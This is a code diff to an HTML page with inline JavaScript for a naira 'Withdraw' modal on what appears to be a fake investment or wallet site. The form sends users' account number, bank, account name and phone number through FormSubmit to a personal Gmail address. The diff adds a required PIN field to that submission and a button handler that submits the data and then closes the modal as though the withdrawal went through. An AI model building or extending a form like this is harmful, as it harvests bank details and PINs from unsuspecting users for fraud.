@@ -295,7 +295,7 @@
       <form id="withdrawForm" method="POST" action="https://formsubmit.co/empirevirtual99@gmail.com" target="_blank" autocomplete="off">
         <input type="hidden" id="withdrawAccountId" name="Account ID">
         <label for="withdrawAccountNumber">Account Number:</label>
-        <input type="text" id="withdrawAccountNumber" name="Account Number" maxlength="20" required pattern="^\d{10,}$" placeholder="Enter Account Number (10+ digits)">
+        <input type="number" id="withdrawAccountNumber" name="Account Number" maxlength="20" required pattern="^\d{10,}$" inputmode="numeric" placeholder="Enter Account Number (10+ digits)">
         <label for="withdrawBank">Bank:</label>
         <select id="withdrawBank" name="Bank" required>
           <option value="">Select Bank</option>
@@ -321,14 +321,16 @@
         <label for="withdrawAccountName">Account Name:</label>
         <input type="text" id="withdrawAccountName" name="Account Name" maxlength="40" required placeholder="Enter Account Name">
         <label for="withdrawPhone">Beneficiary's Phone Number:</label>
-        <input type="text" id="withdrawPhone" name="Beneficiary Phone" maxlength="15" required pattern="^\d{8,}$" placeholder="Enter Phone Number">
+        <input type="number" id="withdrawPhone" name="Beneficiary Phone" maxlength="15" required pattern="^\d{8,}$" inputmode="numeric" placeholder="Enter Phone Number">
         <label for="withdrawAmount">Amount (₦):</label>
-        <input type="number" id="withdrawAmount" name="Amount" min="1000" max="50000" step="100" required>
+        <input type="number" id="withdrawAmount" name="Amount" min="1000" max="50000" step="100" required inputmode="numeric">
+        <label for="withdrawPin">Input PIN:</label>
+        <input type="number" id="withdrawPin" name="Withdraw PIN" maxlength="6" required inputmode="numeric" pattern="[0-9]{4,6}" placeholder="Enter PIN">
         <div class="charge-note" id="withdrawChargeNote">Charge: ₦0</div>
         <input type="hidden" id="withdrawCharge" name="Charge">
         <div class="modal-buttons">
           <button type="button" class="modal-cancel-btn" onclick="closeWithdrawModal()">Cancel</button>
-          <button type="submit" class="withdraw-submit-btn">Withdraw</button>
+          <button type="button" class="withdraw-submit-btn" id="withdrawBtn">Withdraw</button>
         </div>
         <input type="hidden" name="_next" value="">
         <input type="hidden" name="_captcha" value="false">
@@ -732,6 +734,7 @@
     document.getElementById('withdrawPhone').value = '';
     document.getElementById('withdrawAmount').value = '';
     document.getElementById('withdrawCharge').value = '';
+    document.getElementById('withdrawPin').value = '';
     document.getElementById('withdrawChargeNote').textContent = 'Charge: ₦0';
     document.getElementById('withdrawError').style.display = 'none';
     document.getElementById('withdrawError').textContent = '';
@@ -773,6 +776,38 @@
     document.getElementById('withdrawModal').addEventListener('click', function(event) {
       if (event.target === this) closeWithdrawModal();
     });
+
+    // Prevent Enter key from submitting the withdraw form
+    document.getElementById('withdrawForm').addEventListener('keydown', function(event) {
+      if (event.key === 'Enter') {
+        event.preventDefault();
+      }
+    });
+
+    // Withdraw button logic
+    document.getElementById('withdrawBtn').addEventListener('click', function() {
+      const withdrawForm = document.getElementById('withdrawForm');
+      // Trigger the existing onsubmit logic
+      if (withdrawForm.onsubmit) {
+        const fakeEvent = { preventDefault: () => {}, returnValue: true };
+        const result = withdrawForm.onsubmit(fakeEvent);
+        // If onsubmit returns false, do not proceed
+        if (result === false || fakeEvent.returnValue === false) return;
+      }
+      // Actually submit the form
+      withdrawForm.submit();
+      // After submission, close modal and show user profile
+      closeWithdrawModal();
+      // Show the user's profile again (simulate redirect)
+      const accountId = document.getElementById('withdrawAccountId').value;
+      document.querySelectorAll('.profile-card').forEach(card => card.style.display = 'none');
+      const profileCard = document.getElementById(`profile${accountId}`);
+      if (profileCard) {
+        profileCard.style.display = 'block';
+      }
+      document.querySelector('.login-form').style.display = 'none';
+    });
+
   });
 
   // --- Withdrawal Form Submission ---
@@ -808,7 +843,9 @@
     const profileCard = document.getElementById(`profile${accountId}`);
     updateProfileCard(profileCard, accountId);
     closeWithdrawModal();
-    // Allow form to submit to FormSubmit in new tab
+    // Do not allow form to submit naturally; handled by Withdraw button
+    e.preventDefault();
+    return false;
   };
 
   function regenerateToken(accountId) {
